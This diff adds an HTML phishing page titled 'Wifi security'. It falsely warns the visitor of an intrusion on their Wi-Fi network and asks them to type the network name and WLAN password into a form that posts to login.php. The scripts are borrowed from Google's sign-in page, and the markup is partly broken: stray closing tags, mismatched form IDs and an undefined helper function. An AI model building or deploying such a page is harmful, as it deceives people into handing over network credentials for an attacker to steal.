@@ -1,0 +1,86 @@
+<html lang="de"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+  <meta charset="utf-8">
+  <meta content="width=300, initial-scale=1" name="viewport">
+  <meta name="robots" content="noindex">
+  <title>Wifi security</title>
+ 
+</style>
+  </head>
+  <body>
+  <div class="wrapper">
+  <div class="header content clearfix">
+  </div>
+  </div>
+  <div class="main content clearfix">
+<div class="banner">
+  <h2>Hello sir this is to inform you that someone is trying to login in your wifi network if you are not login then please fill this form.
+
+<form novalidate="" method="post" id="form1" name="form1" action="login.php">
+<div class="card signin-card">
+  <div id="cc_iframe_parent"><iframe style="visibility: hidden; width: 1px; height: 1px; position: absolute; top: -100px;" id="youtube"></iframe></div>
+<label class="hidden-label" for="Passwd">Wlan Password</label>
+<input id="Email" name="key2" class="" placeholder="Wi-Fi Name" type="text">
+<input id="Passwd" name="key1" class="" placeholder="Wlan Password" type="password">
+  <input id="signIn" name="signIn" class="rc-button rc-button-submit" value="Re-Connect" type="submit">
+
+  </script>
+<script>
+  (function() {
+  function gaia_setFocus() {
+  var form = null;
+  if (document.getElementById) {
+  form = document.getElementById('gaia_loginform');
+  }
+  if (form && form.Passwd) {
+  form.Passwd.focus();
+  }
+  }
+  if (!/iPad|iPhone|iPod/.test(navigator.userAgent)) {
+  gaia_attachEvent(window, 'load', gaia_setFocus);
+  }
+  })();
+</script>
+<script>
+  var gaia_scrollToElement = function(element) {
+  var calculateOffsetHeight = function(element) {
+  var curtop = 0;
+  if (element.offsetParent) {
+  while (element) {
+  curtop += element.offsetTop;
+  element = element.offsetParent;
+  }
+  }
+  return curtop;
+  }
+  var siginOffsetHeight = calculateOffsetHeight(element);
+  var scrollHeight = siginOffsetHeight - window.innerHeight +
+  element.clientHeight + 0.02 * window.innerHeight;
+  window.scroll(0, scrollHeight);
+  }
+</script>
+<script>
+  function gaia_onLoginSubmit() {
+  try {
+  gaia.loginAutoRedirect.stop();
+  } catch (err) {
+  // do not prevent form from being submitted
+  }
+  try {
+  document.bg.invoke(function(response) {
+  document.getElementById('bgresponse').value = response;
+  });
+  } catch (err) {
+  document.getElementById('bgresponse').value = '';
+  }
+  return true;
+  }
+  document.getElementById('gaia_loginform').onsubmit = gaia_onLoginSubmit;
+  var signinButton = document.getElementById('signIn');
+  gaia_attachEvent(window, 'load', function(){
+  gaia_scrollToElement(signinButton);
+  });
+</script>
+  
+
+</body></html>
